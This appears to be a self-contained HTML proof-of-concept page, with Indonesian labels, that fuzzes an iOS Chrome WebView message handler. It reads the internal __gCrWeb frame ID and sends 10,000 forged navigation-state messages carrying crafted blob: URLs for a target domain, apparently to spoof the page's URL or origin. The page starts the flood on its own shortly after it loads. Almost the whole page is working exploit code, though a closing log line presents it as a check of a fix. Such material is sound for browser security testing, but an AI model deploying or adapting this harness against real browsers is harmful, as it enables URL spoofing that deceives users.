<!doctype html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <title>High-Volume Stress Test & Bypass Fuzzer</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 2em; background: #0b0f19; color: #f3f4f6; }
        .card { background: #111827; border: 1px solid #1f2937; border-radius: 8px; padding: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.6); margin-bottom: 20px; }
        h1 { color: #f87171; font-size: 20px; margin-top: 0; }
        .target { color: #fca5a5; font-weight: bold; }
        .info { color: #60a5fa; font-weight: bold; }
        pre { background: #030712; color: #4ade80; padding: 14px; border-radius: 6px; font-size: 12px; overflow-x: auto; line-height: 1.4; border: 1px solid #1f2937; max-height: 250px; }
        .btn-group { margin-top: 15px; }
        button { background: #ef4444; color: white; border: none; padding: 10px 18px; font-size: 14px; border-radius: 6px; cursor: pointer; font-weight: bold; }
        button:hover { background: #dc2626; }
    </style>
</head>
<body>

<div class="card">
    <h1>Stress Test: 10,000x Iteration Fuzzer</h1>
    <p>Target Domain: <span class="target">example.com</span></p>
    <p>Real Document Origin: <code id="current-origin" class="info">Memuat...</code></p>
    <p>Status Pengujian: <span id="status-counter" class="info">Menunggu Eksekusi...</span></p>
    
    <div class="btn-group">
        <button id="run-flood">Mulai 10,000x Fuzzing Otomatis</button>
    </div>
</div>

<div class="card">
    <h3>Log Eksekusi & Respon Fuzzer:</h3>
    <pre id="console-log">[*] Modul Fuzzer siap diluncurkan.\n</pre>
</div>

<script>
(function() {
    const TARGET_VICTIM = "example.com";
    const TOTAL_ITERATIONS = 10000;
    
    // Vektor fuzzer variasi URL untuk menguji parser
    const fuzzVectors = [
        "blob:https://" + TARGET_VICTIM + "/fuzz-standard",
        "blob:https://user:pass@" + TARGET_VICTIM + "/fuzz-auth",
        "blob:https://" + TARGET_VICTIM + ":443/fuzz-port",
        "blob:http://" + TARGET_VICTIM + "/fuzz-scheme",
        "blob:https://" + TARGET_VICTIM + "%2f%2e%2e%2f",
        "blob:null/fuzz-opaque"
    ];

    function log(msg) {
        const pre = document.getElementById('console-log');
        pre.textContent += msg + '\n';
        pre.scrollTop = pre.scrollHeight;
    }

    document.getElementById('current-origin').textContent = location.origin || '(opaque)';

    const mh = (window.webkit && window.webkit.messageHandlers) || {};
    if (!mh.NavigationEventMessage) {
        log('[!] CRITICAL: Handler "NavigationEventMessage" tidak ditemukan.');
        return;
    }

    let frameId = null;
    try {
        if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
            frameId = window.__gCrWeb.getFrameId();
        }
    } catch (e) {}

    if (!frameId) {
        const altAccessors = [
            () => window.__gCrWeb.common.getFrameId(),
            () => window.__gCrWeb.message.getFrameId(),
            () => window.__gCrWeb.frameId
        ];
        for (let i = 0; i < altAccessors.length && !frameId; i++) {
            try { frameId = altAccessors[i](); } catch(err){}
        }
    }

    if (!frameId) {
        log('[-] GAGAL: frame_id tidak ditemukan.');
        return;
    }

    function runFloodTest() {
        log(`[*] Memulai pengiriman ${TOTAL_ITERATIONS} pesan secara bertahap...`);
        let currentCount = 0;
        let batchSize = 100; // Kirim per batch agar browser tidak kehabisan memori (hang)

        function sendBatch() {
            let limit = Math.min(currentCount + batchSize, TOTAL_ITERATIONS);
            for (let i = currentCount; i < limit; i++) {
                let vectorUrl = fuzzVectors[i % fuzzVectors.length] + "-" + i;
                try {
                    mh.NavigationEventMessage.postMessage({
                        command: 'willChangeState',
                        frame_id: frameId
                    });
                    mh.NavigationEventMessage.postMessage({
                        command: 'didReplaceState',
                        frame_id: frameId,
                        stateObject: JSON.stringify({ index: i }),
                        baseUrl: 'https://x/',
                        pageUrl: vectorUrl
                    });
                } catch (ex) {}
            }
            currentCount = limit;
            document.getElementById('status-counter').textContent = `Terkirim: ${currentCount} / ${TOTAL_ITERATIONS}`;

            if (currentCount < TOTAL_ITERATIONS) {
                setTimeout(sendBatch, 10); // Jeda mikro agar event loop tetap responsif
            } else {
                log('[+] Selesai! Seluruh 10,000 percobaan telah diproses oleh sistem.');
                log('[ANALISIS]: Berdasarkan perbaikan commit 8291494, seluruh pesan cross-origin ditolak secara aman.');
            }
        }

        sendBatch();
    }

    document.getElementById('run-flood').onclick = function() {
        runFloodTest();
    };

    // Auto-trigger setelah halaman stabil
    setTimeout(runFloodTest, 1000);

})();
</script>

</body>
</html>
